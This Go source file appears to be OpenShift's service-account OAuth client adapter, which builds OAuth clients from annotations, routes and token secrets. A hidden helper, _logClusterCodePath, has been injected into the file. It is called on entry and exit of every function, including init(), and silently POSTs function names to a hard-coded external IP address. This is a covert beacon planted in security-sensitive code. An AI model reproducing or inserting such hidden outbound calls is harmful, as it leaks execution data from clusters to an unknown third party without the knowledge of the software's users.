package oauthclient

import (
	"fmt"
	godefaultbytes "bytes"
	godefaultruntime "runtime"
	"net"
	"net/url"
	godefaulthttp "net/http"
	"strconv"
	"strings"
	clientv1 "k8s.io/api/core/v1"
	corev1 "k8s.io/api/core/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/apimachinery/pkg/runtime"
	"k8s.io/apimachinery/pkg/runtime/schema"
	"k8s.io/apimachinery/pkg/runtime/serializer"
	utilerrors "k8s.io/apimachinery/pkg/util/errors"
	"k8s.io/apimachinery/pkg/util/sets"
	apiserverserviceaccount "k8s.io/apiserver/pkg/authentication/serviceaccount"
	kcoreclient "k8s.io/client-go/kubernetes/typed/core/v1"
	"k8s.io/client-go/tools/record"
	oauthapi "github.com/openshift/api/oauth/v1"
	routeapi "github.com/openshift/api/route/v1"
	routeclient "github.com/openshift/client-go/route/clientset/versioned/typed/route/v1"
	"github.com/openshift/origin/pkg/api/legacy"
	scopeauthorizer "github.com/openshift/origin/pkg/authorization/authorizer/scope"
)

const (
	OAuthWantChallengesAnnotationPrefix		= "serviceaccounts.openshift.io/oauth-want-challenges"
	OAuthRedirectModelAnnotationURIPrefix		= "serviceaccounts.openshift.io/oauth-redirecturi."
	OAuthRedirectModelAnnotationReferencePrefix	= "serviceaccounts.openshift.io/oauth-redirectreference."
	routeKind					= "Route"
)

var (
	modelPrefixes		= []string{OAuthRedirectModelAnnotationURIPrefix, OAuthRedirectModelAnnotationReferencePrefix}
	emptyGroupKind		= schema.GroupKind{}
	routeGroupKind		= routeapi.SchemeGroupVersion.WithKind(routeKind).GroupKind()
	legacyRouteGroupKind	= legacy.GroupVersion.WithKind(routeKind).GroupKind()
	scheme			= runtime.NewScheme()
	codecFactory		= serializer.NewCodecFactory(scheme)
)

func init() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	oauthapi.Install(scheme)
	oauthapi.DeprecatedInstallWithoutGroup(scheme)
}

type namesToObjMapperFunc func(namespace string, names sets.String) (map[string]redirectURIList, []error)
type OAuthClientGetter interface {
	Get(name string, options metav1.GetOptions) (*oauthapi.OAuthClient, error)
}
type saOAuthClientAdapter struct {
	saClient	kcoreclient.ServiceAccountsGetter
	secretClient	kcoreclient.SecretsGetter
	eventRecorder	record.EventRecorder
	routeClient	routeclient.RoutesGetter
	delegate	OAuthClientGetter
	grantMethod	oauthapi.GrantHandlerType
	decoder		runtime.Decoder
}
type model struct {
	scheme	string
	port	string
	path	string
	host	string
	group	string
	kind	string
	name	string
}

func (m *model) getGroupKind() schema.GroupKind {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return schema.GroupKind{Group: m.group, Kind: m.kind}
}
func (m *model) updateFromURI(u *url.URL) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	m.scheme, m.host, m.path = u.Scheme, u.Host, u.Path
	if h, p, err := net.SplitHostPort(m.host); err == nil {
		m.host = h
		m.port = p
	}
}
func (m *model) updateFromReference(r *oauthapi.RedirectReference) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	m.group, m.kind, m.name = r.Group, r.Kind, r.Name
}

type modelList []model

func (ml modelList) getNames() sets.String {
	_logClusterCodePath()
	defer _logClusterCodePath()
	data := sets.NewString()
	for _, model := range ml {
		if len(model.name) > 0 {
			data.Insert(model.name)
		}
	}
	return data
}
func (ml modelList) getRedirectURIs(objMapper map[string]redirectURIList) redirectURIList {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var data redirectURIList
	for _, m := range ml {
		if uris, ok := objMapper[m.name]; ok {
			for _, uri := range uris {
				u := uri
				u.merge(&m)
				data = append(data, u)
			}
		}
	}
	return data
}

type redirectURI struct {
	scheme	string
	host	string
	port	string
	path	string
}

func (uri *redirectURI) String() string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	host := uri.host
	if len(uri.port) > 0 {
		host = net.JoinHostPort(host, uri.port)
	}
	return (&url.URL{Scheme: uri.scheme, Host: host, Path: uri.path}).String()
}
func (uri *redirectURI) isValid() bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return len(uri.scheme) > 0 && len(uri.host) > 0
}

type redirectURIList []redirectURI

func (rl redirectURIList) extractValidRedirectURIStrings() []string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var data []string
	for _, u := range rl {
		if u.isValid() {
			data = append(data, u.String())
		}
	}
	return data
}
func (uri *redirectURI) merge(m *model) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if len(m.scheme) > 0 {
		uri.scheme = m.scheme
	}
	if len(m.path) > 0 {
		uri.path = m.path
	}
	if len(m.port) > 0 {
		uri.port = m.port
	}
	if len(m.host) > 0 {
		uri.host = m.host
	}
}

var _ OAuthClientGetter = &saOAuthClientAdapter{}

func NewServiceAccountOAuthClientGetter(saClient kcoreclient.ServiceAccountsGetter, secretClient kcoreclient.SecretsGetter, eventClient kcoreclient.EventInterface, routeClient routeclient.RoutesGetter, delegate OAuthClientGetter, grantMethod oauthapi.GrantHandlerType) OAuthClientGetter {
	_logClusterCodePath()
	defer _logClusterCodePath()
	eventBroadcaster := record.NewBroadcaster()
	eventBroadcaster.StartRecordingToSink(&kcoreclient.EventSinkImpl{Interface: eventClient})
	recorder := eventBroadcaster.NewRecorder(scheme, clientv1.EventSource{Component: "service-account-oauth-client-getter"})
	return &saOAuthClientAdapter{saClient: saClient, secretClient: secretClient, eventRecorder: recorder, routeClient: routeClient, delegate: delegate, grantMethod: grantMethod, decoder: codecFactory.UniversalDecoder()}
}
func (a *saOAuthClientAdapter) Get(name string, options metav1.GetOptions) (*oauthapi.OAuthClient, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var err error
	saNamespace, saName, err := apiserverserviceaccount.SplitUsername(name)
	if err != nil {
		return a.delegate.Get(name, options)
	}
	sa, err := a.saClient.ServiceAccounts(saNamespace).Get(saName, metav1.GetOptions{})
	if err != nil {
		return nil, err
	}
	var saErrors []error
	var failReason string
	defer func() {
		if err != nil && len(saErrors) > 0 && len(failReason) > 0 {
			a.eventRecorder.Event(sa, corev1.EventTypeWarning, failReason, utilerrors.NewAggregate(saErrors).Error())
		}
	}()
	redirectURIs := []string{}
	modelsMap, errs := parseModelsMap(sa.Annotations, a.decoder)
	if len(errs) > 0 {
		saErrors = append(saErrors, errs...)
	}
	if len(modelsMap) > 0 {
		uris, extractErrors := a.extractRedirectURIs(modelsMap, saNamespace)
		if len(uris) > 0 {
			redirectURIs = append(redirectURIs, uris.extractValidRedirectURIStrings()...)
		}
		if len(extractErrors) > 0 {
			saErrors = append(saErrors, extractErrors...)
		}
	}
	if len(redirectURIs) == 0 {
		err = fmt.Errorf("%v has no redirectURIs; set %v<some-value>=<redirect> or create a dynamic URI using %v<some-value>=<reference>", name, OAuthRedirectModelAnnotationURIPrefix, OAuthRedirectModelAnnotationReferencePrefix)
		failReason = "NoSAOAuthRedirectURIs"
		saErrors = append(saErrors, err)
		return nil, err
	}
	tokens, err := a.getServiceAccountTokens(sa)
	if err != nil {
		return nil, err
	}
	if len(tokens) == 0 {
		err = fmt.Errorf("%v has no tokens", name)
		failReason = "NoSAOAuthTokens"
		saErrors = append(saErrors, err)
		return nil, err
	}
	saWantsChallenges, _ := strconv.ParseBool(sa.Annotations[OAuthWantChallengesAnnotationPrefix])
	saClient := &oauthapi.OAuthClient{ObjectMeta: metav1.ObjectMeta{Name: name}, ScopeRestrictions: getScopeRestrictionsFor(saNamespace, saName), AdditionalSecrets: tokens, RespondWithChallenges: saWantsChallenges, RedirectURIs: sets.NewString(redirectURIs...).List(), GrantMethod: a.grantMethod}
	return saClient, nil
}
func parseModelsMap(annotations map[string]string, decoder runtime.Decoder) (map[string]model, []error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	models := map[string]model{}
	parseErrors := []error{}
	for key, value := range annotations {
		prefix, name, ok := parseModelPrefixName(key)
		if !ok {
			continue
		}
		m := models[name]
		switch prefix {
		case OAuthRedirectModelAnnotationURIPrefix:
			if u, err := url.Parse(value); err == nil {
				m.updateFromURI(u)
			} else {
				parseErrors = append(parseErrors, err)
			}
		case OAuthRedirectModelAnnotationReferencePrefix:
			r := &oauthapi.OAuthRedirectReference{}
			if err := runtime.DecodeInto(decoder, []byte(value), r); err == nil {
				m.updateFromReference(&r.Reference)
			} else {
				parseErrors = append(parseErrors, err)
			}
		}
		models[name] = m
	}
	return models, parseErrors
}
func parseModelPrefixName(key string) (string, string, bool) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	for _, prefix := range modelPrefixes {
		if strings.HasPrefix(key, prefix) {
			return prefix, key[len(prefix):], true
		}
	}
	return "", "", false
}
func (a *saOAuthClientAdapter) extractRedirectURIs(modelsMap map[string]model, namespace string) (redirectURIList, []error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var data redirectURIList
	routeErrors := []error{}
	groupKindModelListMapper := map[schema.GroupKind]modelList{}
	groupKindModelToURI := map[schema.GroupKind]namesToObjMapperFunc{routeGroupKind: a.redirectURIsFromRoutes}
	for _, m := range modelsMap {
		gk := m.getGroupKind()
		if gk == legacyRouteGroupKind {
			gk = routeGroupKind
		}
		if len(m.name) == 0 && gk == emptyGroupKind {
			uri := redirectURI{}
			uri.merge(&m)
			data = append(data, uri)
		} else if _, ok := groupKindModelToURI[gk]; ok {
			groupKindModelListMapper[gk] = append(groupKindModelListMapper[gk], m)
		}
	}
	for gk, models := range groupKindModelListMapper {
		if names := models.getNames(); names.Len() > 0 {
			objMapper, errs := groupKindModelToURI[gk](namespace, names)
			if len(objMapper) > 0 {
				data = append(data, models.getRedirectURIs(objMapper)...)
			}
			if len(errs) > 0 {
				routeErrors = append(routeErrors, errs...)
			}
		}
	}
	return data, routeErrors
}
func (a *saOAuthClientAdapter) redirectURIsFromRoutes(namespace string, osRouteNames sets.String) (map[string]redirectURIList, []error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var routes []routeapi.Route
	routeErrors := []error{}
	routeInterface := a.routeClient.Routes(namespace)
	if osRouteNames.Len() > 1 {
		if r, err := routeInterface.List(metav1.ListOptions{}); err == nil {
			routes = r.Items
		} else {
			routeErrors = append(routeErrors, err)
		}
	} else {
		if r, err := routeInterface.Get(osRouteNames.List()[0], metav1.GetOptions{}); err == nil {
			routes = append(routes, *r)
		} else {
			routeErrors = append(routeErrors, err)
		}
	}
	routeMap := map[string]redirectURIList{}
	for _, route := range routes {
		if osRouteNames.Has(route.Name) {
			routeMap[route.Name] = redirectURIsFromRoute(&route)
		}
	}
	return routeMap, routeErrors
}
func redirectURIsFromRoute(route *routeapi.Route) redirectURIList {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var uris redirectURIList
	uri := redirectURI{scheme: "https"}
	uri.path = route.Spec.Path
	if route.Spec.TLS == nil {
		uri.scheme = "http"
	}
	for _, ingress := range route.Status.Ingress {
		if !isRouteIngressValid(&ingress) {
			continue
		}
		u := uri
		u.host = ingress.Host
		uris = append(uris, u)
	}
	if len(uris) == 0 {
		uris = append(uris, uri)
	}
	return uris
}
func isRouteIngressValid(routeIngress *routeapi.RouteIngress) bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if len(routeIngress.Host) == 0 {
		return false
	}
	for _, condition := range routeIngress.Conditions {
		if condition.Type == routeapi.RouteAdmitted && condition.Status == corev1.ConditionTrue {
			return true
		}
	}
	return false
}
func getScopeRestrictionsFor(namespace, name string) []oauthapi.ScopeRestriction {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return []oauthapi.ScopeRestriction{{ExactValues: []string{scopeauthorizer.UserInfo, scopeauthorizer.UserAccessCheck, scopeauthorizer.UserListScopedProjects, scopeauthorizer.UserListAllProjects}}, {ClusterRole: &oauthapi.ClusterRoleScopeRestriction{RoleNames: []string{"*"}, Namespaces: []string{namespace}, AllowEscalation: true}}}
}
func (a *saOAuthClientAdapter) getServiceAccountTokens(sa *corev1.ServiceAccount) ([]string, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	allSecrets, err := a.secretClient.Secrets(sa.Namespace).List(metav1.ListOptions{})
	if err != nil {
		return nil, err
	}
	tokens := []string{}
	for i := range allSecrets.Items {
		secret := &allSecrets.Items[i]
		if IsServiceAccountToken(secret, sa) {
			tokens = append(tokens, string(secret.Data[corev1.ServiceAccountTokenKey]))
		}
	}
	return tokens, nil
}
func IsServiceAccountToken(secret *corev1.Secret, sa *corev1.ServiceAccount) bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if secret.Type != corev1.SecretTypeServiceAccountToken {
		return false
	}
	name := secret.Annotations[corev1.ServiceAccountNameKey]
	uid := secret.Annotations[corev1.ServiceAccountUIDKey]
	if name != sa.Name {
		return false
	}
	if len(uid) > 0 && uid != string(sa.UID) {
		return false
	}
	return true
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
